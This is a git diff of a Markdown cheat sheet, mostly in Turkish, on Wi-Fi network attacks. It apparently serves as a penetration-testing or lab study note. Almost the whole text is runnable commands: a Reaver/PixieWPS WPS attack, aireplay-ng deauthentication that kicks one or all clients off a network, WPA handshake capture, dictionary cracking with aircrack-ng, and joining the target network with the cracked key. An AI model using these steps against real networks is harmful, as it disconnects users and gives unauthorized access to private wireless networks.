@@ -1,10 +1,4 @@
-
-### Hazırlık
-```bash
-sudo su
-ip -br -c a
-```
-
+ 
 ## WPS Attack ##
 
   wash –i wlan0
@@ -13,52 +7,83 @@ ip -br -c a
   for PixieWPS attack you can use "-K" parameter
   reaver -b 13:06:19:94:00:00 -i wlan0mon -v -K
 
-### Monitor Mod + Tarama
+
+## 🎯 GENEL HAZIRLIK
+
+### İnterface Hazırlama
 ```bash
-sudo airmon-ng start wlan0
+# Mevcut interface'leri listele
+iwconfig
+ip -br -c a
+
+# Monitor mod başlat
+airmon-ng check kill
+airmon-ng start wlan0
+
+# Bilgi kontrol
+iw dev wlan0mon info
+```
+
+### Temel Tarama
+```bash
+# Tüm bantları tara (2.4GHz + 5GHz)
 airodump-ng wlan0mon --band abg
+
+# WPS bilgisi ile tara
+airodump-ng wlan0mon --band abg --wps --manufacturer
 ```
 
-### Hedef Ağı Yakala (BSSID, Channel, Client MAC'i not et!)
+---
+
+## 🔴 SENARYO 1: WPA-PSK SALDIRISI
+
+### Adım 1: Hedef Belirleme
 ```bash
-airodump-ng wlan0mon --band abg -c [CHANNEL] --wps --bssid [AP_MAC] -w output_file
+airodump-ng wlan0mon --band abg
+# Not al: BSSID, ESSID, Channel, Client MAC
 ```
 
-## Deauthentication Attack ##
-
-  airmon-ng start wlan0
-  airodump-ng –c <channel> --bssid <BSSID> -w <capture_file> wlan0
-  aireplay-ng -0 1 –a <BSSID> -c <client_Mac> wlan0
-
-### Deauth + Handshake Yakala
+### Adım 2: Hedef Ağı İzle
 ```bash
-aireplay-ng -0 10 -a [AP_MAC] -c [CLIENT_MAC] wlan0mon
-# Handshake yakalandığında Ctrl+C ile durdur (Bu saldırı sonucunda airodump-ng çalıştığımız terminalde sağ üst köşede "WPA handshake: 02:13:37:BE:EF:03" yazısı görünür. Bu handshake'i başarıyla yakaladığımız anlamına gelir.
-)
+airodump-ng wlan0mon -c [CHANNEL] --bssid [BSSID] -w capture
+# Yeni terminal aç:
 ```
 
-### Parola Kır
+### Adım 3: Deauth + Handshake Yakala
 ```bash
-aircrack-ng -w /usr/share/john/password.lst output_file-01.cap
-# KEY FOUND! mesajını bekle ve parolayı kaydet
+# Bir istemciyi kov
+aireplay-ng -0 5 -a [BSSID] -c [CLIENT_MAC] wlan0mon
+
+# Veya tüm istemcileri kov
+aireplay-ng -0 5 -a [BSSID] wlan0mon
+
+# İlk terminalde "WPA handshake: [BSSID]" görününce Ctrl+C
 ```
 
-### Bağlan
+### Adım 4: Parola Kır
 ```bash
-nano wpa_sup.conf
+aircrack-ng -w /usr/share/john/password.lst capture-01.cap -e [ESSID]
+# KEY FOUND! çıktısını bekle
+```
+
+### Adım 5: Bağlan
+```bash
+# Monitor modu durdur
+airmon-ng stop wlan0mon
+
+# Config oluştur
+nano wpa.conf
 ```
 ```
 network={
-    ssid="[SSID]"
+    ssid="[ESSID]"
     scan_ssid=1
     psk="[PAROLA]"
     key_mgmt=WPA-PSK
 }
 ```
 ```bash
-airmon-ng stop wlan0mon
-wpa_supplicant -Dnl80211 -iwlan0 -c wpa_sup.conf
-# Yeni terminal aç:
+wpa_supplicant -D nl80211 -i wlan0 -c wpa.conf &
 dhclient wlan0 -v
 ```
 
